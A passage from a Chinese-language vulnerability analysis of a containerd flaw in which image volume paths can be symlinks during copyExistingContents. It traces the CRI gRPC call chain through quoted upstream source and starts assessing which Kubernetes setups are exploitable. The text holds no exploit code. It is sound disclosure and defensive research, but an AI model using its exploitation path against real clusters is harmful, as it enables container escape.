<p>为了同步卷和容器文件系统中的文件，在创建容器前，调用<code>copyExistingContents(src, host)</code>将卷中的文件复制到容器rootfs中。但这里的<code>src</code>变量是卷内的路径，可能会被修改为软链接。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/opts/container.go#L115">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/opts/container.go#L115</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">WithVolumes</span>(<span style="color:#a6e22e">volumeMounts</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>) <span style="color:#a6e22e">containerd</span>.<span style="color:#a6e22e">NewContainerOpts</span> {
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">client</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">containerd</span>.<span style="color:#a6e22e">Client</span>, <span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">containers</span>.<span style="color:#a6e22e">Container</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
        <span style="color:#f92672">...</span>
        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">host</span>, <span style="color:#a6e22e">volume</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">volumeMounts</span> {
            <span style="color:#75715e">// The volume may have been defined with a C: prefix, which we can&#39;t use here.
</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">volume</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimPrefix</span>(<span style="color:#a6e22e">volume</span>, <span style="color:#e6db74">&#34;C:&#34;</span>)
            <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">mountPath</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">mountPaths</span> {
                <span style="color:#a6e22e">src</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">mountPath</span>, <span style="color:#a6e22e">volume</span>)
                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stat</span>(<span style="color:#a6e22e">src</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">IsNotExist</span>(<span style="color:#a6e22e">err</span>) {
                        <span style="color:#75715e">// Skip copying directory if it does not exist.
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">continue</span>
                    }
                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;stat volume in rootfs: %w&#34;</span>, <span style="color:#a6e22e">err</span>)
                }
                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">copyExistingContents</span>(<span style="color:#a6e22e">src</span>, <span style="color:#a6e22e">host</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;taking runtime copy of volume: %w&#34;</span>, <span style="color:#a6e22e">err</span>)
                }
            }
        }
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
    }
}
</code></pre></div><h3 id="2-调用链分析">2. 调用链分析</h3>
<p>经分析，该漏洞点的完整调用链为：</p>
<ol>
<li>客户端调用containerd提供的GRPC服务，api地址为<code>/runtime.v1.RuntimeService/CreateContainer</code>或 <code>/runtime.v1alpha2.RuntimeService/CreateContainer</code></li>
<li>上述api地址会触发<code>criService.CreateContainer</code>方法</li>
<li><code>criService.CreateContainer</code>方法中调用<code>WithVolumes</code>函数</li>
</ol>
<p>分析过程如下：</p>
<p>根据<a href="https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55">漏洞修复commit</a>, 得知需要调用<code>containerd/containerd/pkg/cri/opts</code>包下的<code>WithVolumes</code>函数，因此需要递归向上找到调用链。</p>
<p>该函数仅被<code>criService.CreateContainer</code>方法调用，作为创建容器的选项将来传递给<code>c.client.NewContainer</code>创建容器。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/container_create.go#L202">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/container_create.go#L202</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">criService</span>) <span style="color:#a6e22e">CreateContainer</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">CreateContainerRequest</span>) (<span style="color:#a6e22e">_</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">CreateContainerResponse</span>, <span style="color:#a6e22e">retErr</span> <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">volumeMounts</span> []<span style="color:#f92672">*</span><span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">Mount</span>
    <span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">IgnoreImageDefinedVolumes</span> {
        <span style="color:#75715e">// Create container image volumes mounts.
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">volumeMounts</span> = <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">volumeMounts</span>(<span style="color:#a6e22e">containerRootDir</span>, <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">GetMounts</span>(), <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">image</span>.<span style="color:#a6e22e">ImageSpec</span>.<span style="color:#a6e22e">Config</span>)
    }
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">volumeMounts</span>) &gt; <span style="color:#ae81ff">0</span> {
        <span style="color:#a6e22e">mountMap</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">v</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">volumeMounts</span> {
            <span style="color:#a6e22e">mountMap</span>[<span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Clean</span>(<span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">HostPath</span>)] = <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">ContainerPath</span>
        }
        <span style="color:#a6e22e">opts</span> = append(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">customopts</span>.<span style="color:#a6e22e">WithVolumes</span>(<span style="color:#a6e22e">mountMap</span>))
    }
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">cntr</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">NewContainer</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">opts</span><span style="color:#f92672">...</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to create containerd container: %w&#34;</span>, <span style="color:#a6e22e">err</span>)
    }
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p><code>criService</code>是一个GRPC服务，在程序init时被加载为插件。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/cri.go#L48">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/cri.go#L48</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">init</span>() {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">plugin</span>.<span style="color:#a6e22e">Register</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">plugin</span>.<span style="color:#a6e22e">Registration</span>{
        <span style="color:#a6e22e">Type</span>:   <span style="color:#a6e22e">plugin</span>.<span style="color:#a6e22e">GRPCPlugin</span>,
        <span style="color:#a6e22e">ID</span>:     <span style="color:#e6db74">&#34;cri&#34;</span>,
        <span style="color:#f92672">...</span>
        <span style="color:#a6e22e">InitFn</span>: <span style="color:#a6e22e">initCRIService</span>,
    })
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">initCRIService</span>(<span style="color:#a6e22e">ic</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">plugin</span>.<span style="color:#a6e22e">InitContext</span>) (<span style="color:#66d9ef">interface</span>{}, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">NewCRIService</span>(<span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">client</span>)
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">s</span>, <span style="color:#66d9ef">nil</span>
}
</code></pre></div><p>凡是被注册为插件的GRPC服务，在containerd启动时，都会执行其注册函数，注册为containerd的一个服务。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/services/server/server.go#L285">https://github.com/containerd/containerd/blob/v1.6.0/services/server/server.go#L285</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">config</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">srvconfig</span>.<span style="color:#a6e22e">Config</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">Server</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">service</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">grpcServices</span> {
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">service</span>.<span style="color:#a6e22e">Register</span>(<span style="color:#a6e22e">grpcServer</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
        }
    }
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p>criService被<code>instrumentedService</code>和<code>instrumentedAlphaService</code>两个服务封装了。criService被注册时实际调用了protobuf的注册函数，把这两个服务注册成为了GRPC服务。两个服务的调用流程是类似的，下面我们以<code>instrumentedService</code>为例继续跟踪。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/service.go#L183">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/service.go#L183</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">criService</span>) <span style="color:#a6e22e">Register</span>(<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">Server</span>) <span style="color:#66d9ef">error</span> {
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">s</span>)
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/service.go#L311">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/service.go#L311</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">criService</span>) <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">Server</span>) <span style="color:#66d9ef">error</span> {
    <span style="color:#a6e22e">instrumented</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">newInstrumentedService</span>(<span style="color:#a6e22e">c</span>)
    <span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">RegisterRuntimeServiceServer</span>(<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">instrumented</span>)
    <span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">RegisterImageServiceServer</span>(<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">instrumented</span>)
    <span style="color:#a6e22e">instrumentedAlpha</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">newInstrumentedAlphaService</span>(<span style="color:#a6e22e">c</span>)
    <span style="color:#a6e22e">runtime_alpha</span>.<span style="color:#a6e22e">RegisterRuntimeServiceServer</span>(<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">instrumentedAlpha</span>)
    <span style="color:#a6e22e">runtime_alpha</span>.<span style="color:#a6e22e">RegisterImageServiceServer</span>(<span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">instrumentedAlpha</span>)
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/vendor/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L8889">https://github.com/containerd/containerd/blob/v1.6.0/vendor/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L8889</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">RegisterRuntimeServiceServer</span>(<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">Server</span>, <span style="color:#a6e22e">srv</span> <span style="color:#a6e22e">RuntimeServiceServer</span>) {
    <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">RegisterService</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">_RuntimeService_serviceDesc</span>, <span style="color:#a6e22e">srv</span>)
}
</code></pre></div><hr>
<p>这样，将来，GRPC服务在被调用时，就会根据<code>_RuntimeService_serviceDesc</code>中声明的api调用对应的服务和函数。例如，当我们想要调用<code>/runtime.v1.RuntimeService/CreateContainer</code> api时，会调用<code>_RuntimeService_CreateContainer_Handler</code>函数，且此时传递给该函数的服务<code>srv</code>为<code>instrumentedService</code>。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/vendor/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L9355">https://github.com/containerd/containerd/blob/v1.6.0/vendor/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L9355</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_RuntimeService_serviceDesc</span> = <span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">ServiceDesc</span>{
    <span style="color:#a6e22e">ServiceName</span>: <span style="color:#e6db74">&#34;runtime.v1.RuntimeService&#34;</span>,
    <span style="color:#a6e22e">HandlerType</span>: (<span style="color:#f92672">*</span><span style="color:#a6e22e">RuntimeServiceServer</span>)(<span style="color:#66d9ef">nil</span>),
    <span style="color:#a6e22e">Methods</span>: []<span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">MethodDesc</span>{
        <span style="color:#f92672">...</span>
        {
            <span style="color:#a6e22e">MethodName</span>: <span style="color:#e6db74">&#34;CreateContainer&#34;</span>,
            <span style="color:#a6e22e">Handler</span>:    <span style="color:#a6e22e">_RuntimeService_CreateContainer_Handler</span>,
        },
        <span style="color:#f92672">...</span>
    },
    <span style="color:#f92672">...</span>
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/vendor/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L9001">https://github.com/containerd/containerd/blob/v1.6.0/vendor/k8s.io/cri-api/pkg/apis/runtime/v1/api.pb.go#L9001</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">_RuntimeService_CreateContainer_Handler</span>(<span style="color:#a6e22e">srv</span> <span style="color:#66d9ef">interface</span>{}, <span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">dec</span> <span style="color:#66d9ef">func</span>(<span style="color:#66d9ef">interface</span>{}) <span style="color:#66d9ef">error</span>, <span style="color:#a6e22e">interceptor</span> <span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">UnaryServerInterceptor</span>) (<span style="color:#66d9ef">interface</span>{}, <span style="color:#66d9ef">error</span>) {
    <span style="color:#a6e22e">in</span> <span style="color:#f92672">:=</span> new(<span style="color:#a6e22e">CreateContainerRequest</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dec</span>(<span style="color:#a6e22e">in</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
    }
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">interceptor</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">srv</span>.(<span style="color:#a6e22e">RuntimeServiceServer</span>).<span style="color:#a6e22e">CreateContainer</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">in</span>)
    }
    <span style="color:#a6e22e">info</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">UnaryServerInfo</span>{
        <span style="color:#a6e22e">Server</span>:     <span style="color:#a6e22e">srv</span>,
        <span style="color:#a6e22e">FullMethod</span>: <span style="color:#e6db74">&#34;/runtime.v1.RuntimeService/CreateContainer&#34;</span>,
    }
    <span style="color:#a6e22e">handler</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">req</span> <span style="color:#66d9ef">interface</span>{}) (<span style="color:#66d9ef">interface</span>{}, <span style="color:#66d9ef">error</span>) {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">srv</span>.(<span style="color:#a6e22e">RuntimeServiceServer</span>).<span style="color:#a6e22e">CreateContainer</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">req</span>.(<span style="color:#f92672">*</span><span style="color:#a6e22e">CreateContainerRequest</span>))
    }
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">interceptor</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">in</span>, <span style="color:#a6e22e">info</span>, <span style="color:#a6e22e">handler</span>)
}
</code></pre></div><hr>
<p>在<code>_RuntimeService_CreateContainer_Handler</code>函数中调用<code>srv.(RuntimeServiceServer).CreateContainer</code>方法时，实际将调用<code>instrumentedService.CreateContainer</code>方法。</p>
<p>而该方法只是对<code>criService.CreateContainer</code>方法的封装，在调用前打印了日志。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/instrumented_service.go#L404">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/instrumented_service.go#L404</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">in</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">instrumentedService</span>) <span style="color:#a6e22e">CreateContainer</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">CreateContainerRequest</span>) (<span style="color:#a6e22e">res</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">CreateContainerResponse</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">in</span>.<span style="color:#a6e22e">checkInitialized</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
    }
    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">G</span>(<span style="color:#a6e22e">ctx</span>).<span style="color:#a6e22e">Infof</span>(<span style="color:#e6db74">&#34;CreateContainer within sandbox %q for container %+v&#34;</span>,
        <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GetPodSandboxId</span>(), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GetConfig</span>().<span style="color:#a6e22e">GetMetadata</span>())
    <span style="color:#66d9ef">defer</span> <span style="color:#66d9ef">func</span>() {
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
            <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">G</span>(<span style="color:#a6e22e">ctx</span>).<span style="color:#a6e22e">WithError</span>(<span style="color:#a6e22e">err</span>).<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;CreateContainer within sandbox %q for %+v failed&#34;</span>,
                <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GetPodSandboxId</span>(), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GetConfig</span>().<span style="color:#a6e22e">GetMetadata</span>())
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">G</span>(<span style="color:#a6e22e">ctx</span>).<span style="color:#a6e22e">Infof</span>(<span style="color:#e6db74">&#34;CreateContainer within sandbox %q for %+v returns container id %q&#34;</span>,
                <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GetPodSandboxId</span>(), <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">GetConfig</span>().<span style="color:#a6e22e">GetMetadata</span>(), <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">GetContainerId</span>())
        }
    }()
    <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">in</span>.<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">CreateContainer</span>(<span style="color:#a6e22e">ctrdutil</span>.<span style="color:#a6e22e">WithNamespace</span>(<span style="color:#a6e22e">ctx</span>), <span style="color:#a6e22e">r</span>)
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">errdefs</span>.<span style="color:#a6e22e">ToGRPC</span>(<span style="color:#a6e22e">err</span>)
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/service.go#L311">https://github.com/containerd/containerd/blob/v1.6.0/pkg/cri/server/service.go#L311</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">criService</span>) <span style="color:#a6e22e">register</span>(<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">Server</span>) <span style="color:#66d9ef">error</span> {
    <span style="color:#a6e22e">instrumented</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">newInstrumentedService</span>(<span style="color:#a6e22e">c</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><p>至此我们确认了<code>criService.CreateContainer</code>方法会作为GRPC服务被调用，调用的api为</p>
<ul>
<li><code>/runtime.v1.RuntimeService/CreateContainer</code></li>
<li><code>/runtime.v1alpha2.RuntimeService/CreateContainer</code></li>
</ul>
<h3 id="3-利用场景分析">3. 利用场景分析</h3>
<p>根据上文分析，达到漏洞点必须要调用cri的api，因此我们需要判断哪些主流使用场景会调用该api，包括以下场景需要分析：</p>
<ol>
<li>k8s+containerd</li>
<li>k8s+docker+containerd</li>
<li>docker+containerd</li>
<li>ctr+containerd</li>
</ol>
<h4 id="31-k8scontainerd">3.1 k8s+containerd</h4>
<p>k8s+containerd场景存在漏洞。</p>
<p>根据上文调用链分析，如果存在漏洞，要求k8s调用containerd的api <code>/runtime.v1.RuntimeService/CreateContainer</code>或<code>/runtime.v1alpha2.RuntimeService/CreateContainer</code>。经正向分析验证，k8s在创建容器时会调用该api，分析过程如下：</p>
<p>在初始化Kubelet时，给定了syncPod方法，这个方法会将容器同步至期望状态。</p>
<blockquote>
<p>因为k8s基于reconciler模式的设计，分析出该方法的调用链会过于冗长，限于篇幅限制，该方法的调用链，本文不会详细分析。分析k8s对容器runtime的调用，我们可以直接从这个函数开始分析。</p>
</blockquote>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kubelet.go#L649">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kubelet.go#L649</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewMainKubelet</span>(<span style="color:#f92672">...</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">Kubelet</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">klet</span>.<span style="color:#a6e22e">podWorkers</span> = <span style="color:#a6e22e">newPodWorkers</span>(
        <span style="color:#a6e22e">klet</span>.<span style="color:#a6e22e">syncPod</span>,
        <span style="color:#f92672">...</span>
    )
    <span style="color:#a6e22e">runtime</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">kuberuntime</span>.<span style="color:#a6e22e">NewKubeGenericRuntimeManager</span>(<span style="color:#f92672">...</span>)
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">klet</span>.<span style="color:#a6e22e">containerRuntime</span> = <span style="color:#a6e22e">runtime</span>
    <span style="color:#f92672">...</span>
}
</code></pre></div><hr>
<p><code>Kubelet.syncPod</code>方法中，会调用<code>containerRuntime.SyncPod</code>方法，而<code>containerRuntime</code>就是在初始化kubelet时给定的<code>kubeGenericRuntimeManager</code>对象。</p>
<p><a href="https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kubelet.go#L1540">https://github.com/kubernetes/kubernetes/blob/v1.23.4/pkg/kubelet/kubelet.go#L1540</a></p>
